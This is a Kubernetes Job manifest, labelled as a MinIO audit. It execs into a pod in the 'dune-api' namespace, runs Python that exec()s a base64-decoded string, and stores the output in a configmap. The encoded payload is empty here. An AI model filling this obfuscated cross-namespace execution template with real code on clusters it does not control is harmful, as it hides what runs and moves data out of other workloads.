apiVersion: batch/v1
kind: Job
metadata:
  name: audit-minio-v80
  namespace: default
spec:
  ttlSecondsAfterFinished: 300
  backoffLimit: 1
  activeDeadlineSeconds: 120
  template:
    spec:
      serviceAccountName: n8n-audit-sa
      restartPolicy: Never
      containers:
      - name: audit
        image: bitnami/kubectl:latest
        command: ["/bin/sh"]
        args:
        - "-c"
        - >-
          DUNEAPI_POD=$(kubectl get pod -n dune-api -o jsonpath='{.items[0].metadata.name}' 2>/dev/null);
          if [ -n "$DUNEAPI_POD" ]; then
            RESULT=$(kubectl exec -n dune-api "$DUNEAPI_POD" -- python3 -c "exec(__import__('base64').b64decode('').decode())" 2>&1 | tr -d '\n' | head -c 6000);
            kubectl patch configmap dune-audit-result4 -n default --type merge -p "{\"data\":{\"minio_result\":\"$RESULT\"}}";
          else
            kubectl patch configmap dune-audit-result4 -n default --type merge -p '{"data":{"minio_result":"no_pod"}}';
          fi;
          echo DONE